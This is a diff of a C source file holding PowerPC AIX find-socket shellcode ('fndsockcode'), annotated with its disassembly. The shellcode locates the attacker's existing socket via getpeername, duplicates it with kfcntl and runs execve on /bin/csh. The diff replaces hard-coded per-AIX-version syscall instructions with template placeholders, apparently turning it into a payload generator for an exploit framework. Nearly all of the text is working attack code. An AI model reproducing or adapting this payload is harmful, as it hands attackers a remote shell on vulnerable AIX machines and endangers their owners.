@@ -56,34 +56,7 @@ char fndsockcode[]=         /*  220 bytes                         */
     "\x7f\x65\xdb\x78"      /*  mr      r5,r27                    */
     "\x7f\x84\xe3\x78"      /*  mr      r4,r28                    */
     "\x7f\xe3\xfb\x78"      /*  mr      r3,r31                    */
-#ifdef AIX614
-    "\x38\x5d\xf8\xd4"      /*  cal     r2,-1836(r29)             */
-#endif
-#ifdef AIX613
-    "\x38\x5d\xf8\xce"      /*  cal     r2,-1842(r29)             */
-#endif
-#ifdef AIX612
-    "\x38\x5d\xf8\xce"      /*  cal     r2,-1842(r29)             */
-#endif
-#ifdef AIX611
-    "\x38\x5d\xf8\xcb"      /*  cal     r2,-1845(r29)             */
-#endif
-#ifdef AIX610
-    "\x38\x5d\xf8\xcc"      /*  cal     r2,-1844(r29)             */
-#endif
-#ifdef AIX5310
-    "\x38\x5d\xf8\xc7"      /*  cal     r2,-1849(r29)             */
-#endif
-#ifdef AIX539
-    "\x38\x5d\xf8\xc7"      /*  cal     r2,-1849(r29)             */
-#endif
-#ifdef AIX538
-    "\x38\x5d\xf8\xc7"      /*  cal     r2,-1849(r29)             */
-#endif
-#ifdef AIX537
-    "\x38\x5d\xf8\xc7"      /*  cal     r2,-1849(r29)             */
-#endif
-
+<%= @getpeername %>
     "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
     "\x4e\x80\x04\x21"      /*  bctrl                             */
     "\x3b\x5c\x01\xff"      /*  cal     r26,511(r28)              */
@@ -92,67 +65,13 @@ char fndsockcode[]=         /*  220 bytes                         */
     "\x40\x82\xff\xd4"      /*  bne     <fndsockcode+64>          */
     "\x3b\x3d\xf8\x03"      /*  cal     r25,-2045(r29)            */
     "\x7f\x23\xcb\x78"      /*  mr      r3,r25                    */
-#ifdef AIX614
-    "\x38\x5d\xf9\x17"      /*  cal     r2,-1769(r29)             */
-#endif
-#ifdef AIX613
-    "\x38\x5d\xf9\x11"      /*  cal     r2,-1775(r29)             */
-#endif
-#ifdef AIX612
-    "\x38\x5d\xf9\x11"      /*  cal     r2,-1775(r29)             */
-#endif
-#ifdef AIX611
-    "\x38\x5d\xf9\x0e"      /*  cal     r2,-1778(r29)             */
-#endif
-#ifdef AIX610
-    "\x38\x5d\xf9\x0e"      /*  cal     r2,-1778(r29)             */
-#endif
-#ifdef AIX5310
-    "\x38\x5d\xf8\xf6"      /*  cal     r2,-1802(r29)             */
-#endif
-#ifdef AIX539
-    "\x38\x5d\xf8\xf6"      /*  cal     r2,-1802(r29)             */
-#endif
-#ifdef AIX538
-    "\x38\x5d\xf8\xf6"      /*  cal     r2,-1802(r29)             */
-#endif
-#ifdef AIX537
-    "\x38\x5d\xf8\xf6"      /*  cal     r2,-1802(r29)             */
-#endif
-
+<%= @close %>
     "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
     "\x4e\x80\x04\x21"      /*  bctrl                             */
     "\x7f\x25\xcb\x78"      /*  mr      r5,r25                    */
     "\x7c\x84\x22\x78"      /*  xor     r4,r4,r4                  */
     "\x7f\xe3\xfb\x78"      /*  mr      r3,r31                    */
-#ifdef AIX614
-    "\x38\x5d\xfa\x93"      /*  cal     r2,-1389(r29)             */
-#endif
-#ifdef AIX613
-    "\x38\x5d\xfa\x85"      /*  cal     r2,-1403(r29)             */
-#endif
-#ifdef AIX612
-    "\x38\x5d\xfa\x7c"      /*  cal     r2,-1412(r29)             */
-#endif
-#ifdef AIX611
-    "\x38\x5d\xfa\x67"      /*  cal     r2,-1433(r29)             */
-#endif
-#ifdef AIX610
-    "\x38\x5d\xfa\x6a"      /*  cal     r2,-1430(r29)             */
-#endif
-#ifdef AIX5310
-    "\x38\x5d\xf9\xee"      /*  cal     r2,-1554(r29)             */
-#endif
-#ifdef AIX539
-    "\x38\x5d\xf9\xee"      /*  cal     r2,-1554(r29)             */
-#endif
-#ifdef AIX538
-    "\x38\x5d\xf9\xee"      /*  cal     r2,-1554(r29)             */
-#endif
-#ifdef AIX537
-    "\x38\x5d\xf9\xee"      /*  cal     r2,-1554(r29)             */
-#endif
-
+<%= @kfcntl %>
     "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
     "\x4e\x80\x04\x21"      /*  bctrl                             */
     "\x37\x39\xff\xff"      /*  ai.     r25,r25,-1                */
@@ -166,34 +85,7 @@ char fndsockcode[]=         /*  220 bytes                         */
     "\x94\xa1\xff\xfc"      /*  stu     r5,-4(r1)                 */
     "\x94\x61\xff\xfc"      /*  stu     r3,-4(r1)                 */
     "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
-#ifdef AIX614
-    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
-#endif
-#ifdef AIX613
-    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
-#endif
-#ifdef AIX612
-    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
-#endif
-#ifdef AIX611
-    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
-#endif
-#ifdef AIX610
-    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
-#endif
-#ifdef AIX5310
-    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
-#endif
-#ifdef AIX539
-    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
-#endif
-#ifdef AIX538
-    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
-#endif
-#ifdef AIX537
-    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
-#endif
-
+<%= @execve %>
     "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
     "\x4e\x80\x04\x21"      /*  bctrl                             */
     "/bin/csh"
